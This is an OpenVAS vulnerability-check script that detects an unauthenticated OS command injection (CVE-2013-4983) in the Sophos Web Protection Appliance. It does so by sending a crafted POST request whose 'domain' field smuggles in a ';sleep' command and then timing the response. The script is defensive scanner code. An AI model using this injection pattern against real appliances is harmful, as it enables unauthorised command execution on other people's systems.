###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sophos_web_appliance_mult_vuln_09_2013.nasl 11 2013-10-27 10:12:02Z jan $
#
# Sophos Web Protection Appliance Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

tag_summary = "Sophos Web Protection Appliance is prone to multiple vulnerabilities.";

tag_affected = "Sophos Web Appliance v3.7.9 and earlier.
Sophos Web Appliance v3.8.0.
Sophos Web Appliance v3.8.1.";

tag_solution = "Update to v3.7.9.1/v3.8.1.1";

tag_impact = "An unauthenticated remote attacker can execute arbitrary OS commands
on the Sophos appliance with the privileges of the spiderman operating system user.";

tag_insight = "Sophos Web Protection Appliance is prone to a pre-authentication OS
command injection vulnerability and to a privilege escalation through local OS command
injection vulnerability";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103781";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_cve_id("CVE-2013-4983","CVE-2013-4983");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");
 script_name("Sophos Web Protection Appliance Multiple Vulnerabilities");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-09-09 14:28:20 +0200 (Mon, 09 Sep 2013)");

 desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

 script_description(desc);
 script_xref(name:"URL" , value:"http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities");
 script_summary("Determine if it is possible to execute a system command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 443);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
 } 

 exit(0);
}

include("http_func.inc");
include("openvas-https.inc");

port = 443;
if(!get_port_state(port))exit(0);

url =  "/index.php";
req = http_get(item:url, port:port);
buf = https_req_get(port:port, request:req);

if("<title>Sophos Web Appliance" >!< buf)exit(0);

host = get_host_name();

sleep = make_list(3, 5, 8);

foreach i (sleep) {

  ex = 'url=aHR0cDovL29wZW52YXMub3JnCg%3d%3d&args_reason=something_different_than_filetypewarn&filetype=dummy&user=buffalo' + 
       '&user_encoded=YnVmZmFsbw%3d%3d&domain=http%3a%2f%2fopenvas.org%3bsleep%20' + i +  
       '&raw_category_id=one%7ctwo%7cthree%7cfour';

  len = strlen(ex);

  req = 'POST /end-user/index.php?c=blocked&action=continue HTTP/1.1\r\n' + 
        'Host: ' + host + '\r\n' + 
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: ' + len + '\r\n' + 
        'Connection: close\r\n' + 
        '\r\n' + 
        ex;

  start = unixtime();
  buf = https_req_get(port:port, request:req);
  stop = unixtime();

  if("openvas.org" >!< buf)exit(0);

  if(stop - start < i || stop - start > (i+5)) exit(99); # not vulnerable

}

security_hole(port:port);
exit(0);
